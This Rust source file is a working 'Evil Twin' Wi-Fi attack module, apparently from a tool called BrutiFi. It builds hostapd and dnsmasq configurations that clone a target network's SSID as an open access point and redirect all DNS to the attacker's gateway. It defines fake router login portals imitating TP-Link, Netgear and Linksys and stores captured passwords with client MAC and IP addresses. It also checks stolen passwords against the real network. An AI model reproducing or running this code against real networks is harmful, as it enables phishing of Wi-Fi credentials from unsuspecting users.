/*!
 * Evil Twin Attack Module
 *
 * Implements rogue AP creation with captive portal to capture WiFi credentials.
 * Components:
 * - hostapd: Creates fake AP with same SSID
 * - dnsmasq: DHCP/DNS server redirecting all traffic
 * - Captive portal: Web server presenting fake login page
 * - Credential validation: Tests captured passwords against real AP
 */

use serde::{Deserialize, Serialize};
use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

/// Portal template selection
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PortalTemplate {
    /// Generic WiFi login portal
    Generic,
    /// TP-Link router style
    TpLink,
    /// Netgear router style
    Netgear,
    /// Linksys router style
    Linksys,
}

impl std::fmt::Display for PortalTemplate {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PortalTemplate::Generic => write!(f, "Generic"),
            PortalTemplate::TpLink => write!(f, "TP-Link"),
            PortalTemplate::Netgear => write!(f, "Netgear"),
            PortalTemplate::Linksys => write!(f, "Linksys"),
        }
    }
}

/// Evil Twin attack parameters
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvilTwinParams {
    /// Target SSID to impersonate
    pub target_ssid: String,
    /// Target BSSID (optional)
    pub target_bssid: Option<String>,
    /// Target channel
    pub target_channel: u32,
    /// Interface to use for AP
    pub interface: String,
    /// Portal template to use
    pub portal_template: PortalTemplate,
    /// Port for web server
    pub web_port: u16,
    /// DHCP range start
    pub dhcp_range_start: String,
    /// DHCP range end
    pub dhcp_range_end: String,
    /// Gateway IP
    pub gateway_ip: String,
}

impl Default for EvilTwinParams {
    fn default() -> Self {
        Self {
            target_ssid: String::new(),
            target_bssid: None,
            target_channel: 6,
            interface: "en0".to_string(),
            portal_template: PortalTemplate::Generic,
            web_port: 80,
            dhcp_range_start: "192.168.1.100".to_string(),
            dhcp_range_end: "192.168.1.200".to_string(),
            gateway_ip: "192.168.1.1".to_string(),
        }
    }
}

/// Evil Twin attack result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum EvilTwinResult {
    /// Attack running
    Running,
    /// Password found and validated
    PasswordFound { password: String },
    /// Attack stopped by user
    Stopped,
    /// Error occurred
    Error(String),
}

/// Evil Twin attack progress updates
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum EvilTwinProgress {
    /// Attack started
    Started,
    /// Current step progress
    Step {
        current: u8,
        total: u8,
        description: String,
    },
    /// Client connected
    ClientConnected { mac: String, ip: String },
    /// Credential attempt received
    CredentialAttempt { password: String },
    /// Credential validated successfully
    PasswordFound { password: String },
    /// Credential validation failed
    ValidationFailed { password: String },
    /// Error occurred
    Error(String),
    /// Log message
    Log(String),
}

/// Captured credential
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapturedCredential {
    pub ssid: String,
    pub password: String,
    pub client_mac: String,
    pub client_ip: String,
    pub timestamp: u64,
    pub validated: bool,
}

/// Evil Twin attack state
pub struct EvilTwinState {
    pub running: Arc<AtomicBool>,
    pub hostapd_process: Arc<Mutex<Option<Child>>>,
    pub dnsmasq_process: Arc<Mutex<Option<Child>>>,
    pub web_server_handle: Arc<Mutex<Option<tokio::task::JoinHandle<()>>>>,
    pub captured_credentials: Arc<Mutex<Vec<CapturedCredential>>>,
}

impl EvilTwinState {
    pub fn new() -> Self {
        Self {
            running: Arc::new(AtomicBool::new(true)),
            hostapd_process: Arc::new(Mutex::new(None)),
            dnsmasq_process: Arc::new(Mutex::new(None)),
            web_server_handle: Arc::new(Mutex::new(None)),
            captured_credentials: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);

        // Stop hostapd
        if let Ok(mut process) = self.hostapd_process.lock() {
            if let Some(ref mut child) = *process {
                let _ = child.kill();
            }
            *process = None;
        }

        // Stop dnsmasq
        if let Ok(mut process) = self.dnsmasq_process.lock() {
            if let Some(ref mut child) = *process {
                let _ = child.kill();
            }
            *process = None;
        }

        // Stop web server
        if let Ok(mut handle) = self.web_server_handle.lock() {
            if let Some(h) = handle.take() {
                h.abort();
            }
        }
    }
}

/// Check if hostapd is installed
pub fn check_hostapd_installed() -> bool {
    Command::new("hostapd")
        .arg("-v")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok()
}

/// Get hostapd version
pub fn get_hostapd_version() -> Option<String> {
    let output = Command::new("hostapd").arg("-v").output().ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{}{}", stdout, stderr);

    for line in combined.lines() {
        if line.contains("hostapd") {
            return Some(line.trim().to_string());
        }
    }

    None
}

/// Check if dnsmasq is installed
pub fn check_dnsmasq_installed() -> bool {
    Command::new("dnsmasq")
        .arg("--version")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok()
}

/// Get dnsmasq version
pub fn get_dnsmasq_version() -> Option<String> {
    let output = Command::new("dnsmasq").arg("--version").output().ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout);

    for line in stdout.lines() {
        if line.contains("Dnsmasq") {
            return Some(line.trim().to_string());
        }
    }

    None
}

/// Generate hostapd configuration file
pub fn generate_hostapd_config(params: &EvilTwinParams) -> anyhow::Result<PathBuf> {
    let config_path = PathBuf::from("/tmp/brutifi_hostapd.conf");

    let config_content = format!(
        r#"# BrutiFi Evil Twin - hostapd configuration
interface={}
driver=nl80211
ssid={}
channel={}
hw_mode=g
ieee80211n=1
wmm_enabled=1

# Open network (no encryption for captive portal)
auth_algs=1
wpa=0
"#,
        params.interface, params.target_ssid, params.target_channel
    );

    let mut file = fs::File::create(&config_path)?;
    file.write_all(config_content.as_bytes())?;

    Ok(config_path)
}

/// Generate dnsmasq configuration file
pub fn generate_dnsmasq_config(params: &EvilTwinParams) -> anyhow::Result<PathBuf> {
    let config_path = PathBuf::from("/tmp/brutifi_dnsmasq.conf");

    let config_content = format!(
        r#"# BrutiFi Evil Twin - dnsmasq configuration
interface={}
dhcp-range={},{},12h
dhcp-option=3,{}
dhcp-option=6,{}
server=8.8.8.8
log-queries
log-dhcp
address=/#/{}
"#,
        params.interface,
        params.dhcp_range_start,
        params.dhcp_range_end,
        params.gateway_ip,
        params.gateway_ip,
        params.gateway_ip
    );

    let mut file = fs::File::create(&config_path)?;
    file.write_all(config_content.as_bytes())?;

    Ok(config_path)
}

/// Start hostapd with configuration
pub fn start_hostapd(
    config_path: &PathBuf,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> anyhow::Result<Child> {
    let _ = progress_tx.send(EvilTwinProgress::Log(
        "Starting hostapd (rogue AP)...".to_string(),
    ));

    let child = Command::new("hostapd")
        .arg(config_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let _ = progress_tx.send(EvilTwinProgress::Log("✓ hostapd started".to_string()));

    Ok(child)
}

/// Start dnsmasq with configuration
pub fn start_dnsmasq(
    config_path: &PathBuf,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> anyhow::Result<Child> {
    let _ = progress_tx.send(EvilTwinProgress::Log(
        "Starting dnsmasq (DHCP/DNS)...".to_string(),
    ));

    let child = Command::new("dnsmasq")
        .arg("-C")
        .arg(config_path)
        .arg("--no-daemon")
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let _ = progress_tx.send(EvilTwinProgress::Log("✓ dnsmasq started".to_string()));

    Ok(child)
}

/// Configure interface for AP mode
pub fn configure_interface(
    interface: &str,
    ip: &str,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> anyhow::Result<()> {
    let _ = progress_tx.send(EvilTwinProgress::Log(format!(
        "Configuring interface {} with IP {}...",
        interface, ip
    )));

    // Bring interface down
    let _ = Command::new("ifconfig")
        .arg(interface)
        .arg("down")
        .output()?;

    // Set IP address
    let _ = Command::new("ifconfig")
        .arg(interface)
        .arg(ip)
        .arg("netmask")
        .arg("255.255.255.0")
        .output()?;

    // Bring interface up
    let _ = Command::new("ifconfig").arg(interface).arg("up").output()?;

    let _ = progress_tx.send(EvilTwinProgress::Log(format!(
        "✓ Interface {} configured",
        interface
    )));

    Ok(())
}

/// Validate password against real AP
pub fn validate_password_against_ap(
    ssid: &str,
    _bssid: Option<&str>,
    password: &str,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> bool {
    let _ = progress_tx.send(EvilTwinProgress::Log(format!(
        "Validating password '{}' against AP '{}'...",
        password, ssid
    )));

    // On macOS, we can try to connect using networksetup
    // For now, this is a placeholder - real implementation would use
    // CoreWLAN or networksetup to attempt connection

    #[cfg(target_os = "macos")]
    {
        // Try to join network with password
        let output = Command::new("networksetup")
            .arg("-setairportnetwork")
            .arg("en0")
            .arg(ssid)
            .arg(password)
            .output();

        if let Ok(result) = output {
            if result.status.success() {
                let _ = progress_tx.send(EvilTwinProgress::Log(
                    "✅ Password validated successfully!".to_string(),
                ));
                return true;
            }
        }
    }

    let _ = progress_tx.send(EvilTwinProgress::Log(
        "❌ Password validation failed".to_string(),
    ));
    false
}

/// Run Evil Twin attack
pub fn run_evil_twin_attack(
    params: &EvilTwinParams,
    state: Arc<EvilTwinState>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> EvilTwinResult {
    let _ = progress_tx.send(EvilTwinProgress::Started);

    // Step 1: Check tools
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 1,
        total: 6,
        description: "Verifying tools installation".to_string(),
    });

    if !check_hostapd_installed() {
        let _ = progress_tx.send(EvilTwinProgress::Error(
            "hostapd not found. Install with: brew install hostapd".to_string(),
        ));
        return EvilTwinResult::Error("hostapd not installed".to_string());
    }

    if !check_dnsmasq_installed() {
        let _ = progress_tx.send(EvilTwinProgress::Error(
            "dnsmasq not found. Install with: brew install dnsmasq".to_string(),
        ));
        return EvilTwinResult::Error("dnsmasq not installed".to_string());
    }

    let _ = progress_tx.send(EvilTwinProgress::Log("✓ Tools verified".to_string()));

    // Step 2: Configure interface
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 2,
        total: 6,
        description: "Configuring network interface".to_string(),
    });

    if let Err(e) = configure_interface(&params.interface, &params.gateway_ip, progress_tx) {
        let _ = progress_tx.send(EvilTwinProgress::Error(format!(
            "Failed to configure interface: {}",
            e
        )));
        return EvilTwinResult::Error(format!("Interface configuration failed: {}", e));
    }

    // Step 3: Generate configurations
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 3,
        total: 6,
        description: "Generating configurations".to_string(),
    });

    let hostapd_config = match generate_hostapd_config(params) {
        Ok(path) => path,
        Err(e) => {
            let _ = progress_tx.send(EvilTwinProgress::Error(format!(
                "Failed to generate hostapd config: {}",
                e
            )));
            return EvilTwinResult::Error("Configuration generation failed".to_string());
        }
    };

    let dnsmasq_config = match generate_dnsmasq_config(params) {
        Ok(path) => path,
        Err(e) => {
            let _ = progress_tx.send(EvilTwinProgress::Error(format!(
                "Failed to generate dnsmasq config: {}",
                e
            )));
            return EvilTwinResult::Error("Configuration generation failed".to_string());
        }
    };

    let _ = progress_tx.send(EvilTwinProgress::Log(
        "✓ Configurations generated".to_string(),
    ));

    // Step 4: Start hostapd
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 4,
        total: 6,
        description: "Starting rogue AP".to_string(),
    });

    let hostapd_child = match start_hostapd(&hostapd_config, progress_tx) {
        Ok(child) => child,
        Err(e) => {
            let _ = progress_tx.send(EvilTwinProgress::Error(format!(
                "Failed to start hostapd: {}",
                e
            )));
            return EvilTwinResult::Error("hostapd start failed".to_string());
        }
    };

    if let Ok(mut process) = state.hostapd_process.lock() {
        *process = Some(hostapd_child);
    }

    // Wait a bit for hostapd to initialize
    std::thread::sleep(Duration::from_secs(2));

    // Step 5: Start dnsmasq
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 5,
        total: 6,
        description: "Starting DHCP/DNS server".to_string(),
    });

    let dnsmasq_child = match start_dnsmasq(&dnsmasq_config, progress_tx) {
        Ok(child) => child,
        Err(e) => {
            let _ = progress_tx.send(EvilTwinProgress::Error(format!(
                "Failed to start dnsmasq: {}",
                e
            )));
            state.stop();
            return EvilTwinResult::Error("dnsmasq start failed".to_string());
        }
    };

    if let Ok(mut process) = state.dnsmasq_process.lock() {
        *process = Some(dnsmasq_child);
    }

    // Step 6: Attack running
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 6,
        total: 6,
        description: "Evil Twin active - waiting for clients".to_string(),
    });

    let _ = progress_tx.send(EvilTwinProgress::Log(format!(
        "🎯 Evil Twin active on channel {} with SSID '{}'",
        params.target_channel, params.target_ssid
    )));

    let _ = progress_tx.send(EvilTwinProgress::Log(
        "Waiting for clients to connect...".to_string(),
    ));

    EvilTwinResult::Running
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_portal_template_display() {
        assert_eq!(PortalTemplate::Generic.to_string(), "Generic");
        assert_eq!(PortalTemplate::TpLink.to_string(), "TP-Link");
        assert_eq!(PortalTemplate::Netgear.to_string(), "Netgear");
        assert_eq!(PortalTemplate::Linksys.to_string(), "Linksys");
    }

    #[test]
    fn test_evil_twin_params_default() {
        let params = EvilTwinParams::default();
        assert_eq!(params.target_channel, 6);
        assert_eq!(params.interface, "en0");
        assert_eq!(params.web_port, 80);
        assert_eq!(params.gateway_ip, "192.168.1.1");
    }

    #[test]
    fn test_check_tools_installed() {
        // Just verify functions don't panic
        let _ = check_hostapd_installed();
        let _ = check_dnsmasq_installed();
        let _ = get_hostapd_version();
        let _ = get_dnsmasq_version();
    }

    #[test]
    fn test_generate_hostapd_config() {
        let params = EvilTwinParams {
            target_ssid: "TestNetwork".to_string(),
            target_channel: 11,
            interface: "wlan0".to_string(),
            ..Default::default()
        };

        let result = generate_hostapd_config(&params);
        assert!(result.is_ok());

        // Clean up
        let _ = fs::remove_file("/tmp/brutifi_hostapd.conf");
    }

    #[test]
    fn test_generate_dnsmasq_config() {
        let params = EvilTwinParams::default();
        let result = generate_dnsmasq_config(&params);
        assert!(result.is_ok());

        // Clean up
        let _ = fs::remove_file("/tmp/brutifi_dnsmasq.conf");
    }
}
